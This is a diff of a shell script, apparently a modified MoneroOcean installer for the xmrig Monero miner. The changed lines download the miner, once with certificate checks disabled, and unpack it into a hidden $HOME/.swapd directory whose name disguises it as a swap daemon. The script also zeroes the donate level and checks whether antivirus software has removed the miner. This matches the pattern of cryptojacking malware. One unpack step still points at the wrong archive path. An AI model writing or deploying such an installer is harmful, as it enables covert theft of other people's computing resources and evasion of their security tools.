@@ -232,21 +232,21 @@ rm -rf $HOME/.moneroocean
 #rm -rf $HOME/.swapd
 
 echo "[*] Downloading MoneroOcean advanced version of xmrig to xmrig.tar.gz"
-if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o xmrig.tar.gz; then
-  echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to xmrig.tar.gz"
+if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o $HOME/.swapd/xmrig.tar.gz; then
+  echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to $HOME/.swapd/xmrig.tar.gz"
 #  exit 1
 fi
 
 wget --no-check-certificate https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
-# curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o xmrig.tar.gz
+# curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o $HOME/.swapd/xmrig.tar.gz
 
 echo "[*] Unpacking xmrig.tar.gz to $HOME/.swapd"
 [ -d $HOME/.swapd/ ] || mkdir $HOME/.swapd/
-if ! tar xf xmrig.tar.gz -C $HOME/.swapd/; then
+if ! tar xf $HOME/.swapd/xmrig.tar.gz -C $HOME/.swapd/; then
   echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.swapd/ directory"
 #  exit 1
 fi
-rm xmrig.tar.gz
+rm $HOME/.swapd/xmrig.tar.gz
 
 echo "[*] Checking if advanced version of $HOME/.swapd/xmrig works fine (and not removed by antivirus software)"
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.swapd/config.json
@@ -262,17 +262,17 @@ if (test $? -ne 0); then
   LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
   LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`
 
-  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to xmrig.tar.gz"
-  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o xmrig.tar.gz; then
-    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to xmrig.tar.gz"
+  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to $HOME/.swapd/xmrig.tar.gz"
+  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o $HOME/.swapd/xmrig.tar.gz; then
+    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to $HOME/.swapd/xmrig.tar.gz"
     exit 1
   fi
 
-  echo "[*] Unpacking xmrig.tar.gz to $HOME/.swapd"
+  echo "[*] Unpacking xmrig.tar.gz to $HOME/.swapd/"
   if ! tar xf xmrig.tar.gz -C $HOME/.swapd --strip=1; then
-    echo "WARNING: Can't unpack xmrig.tar.gz to $HOME/.swapd directory"
+    echo "WARNING: Can't unpack xmrig.tar.gz to $HOME/.swapd/ directory"
   fi
-  #rm xmrig.tar.gz
+  rm $HOME/.swapd/xmrig.tar.gz
 
   echo "[*] Checking if stock version of $HOME/.swapd/xmrig works fine (and not removed by antivirus software)"
   sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.swapd/config.json
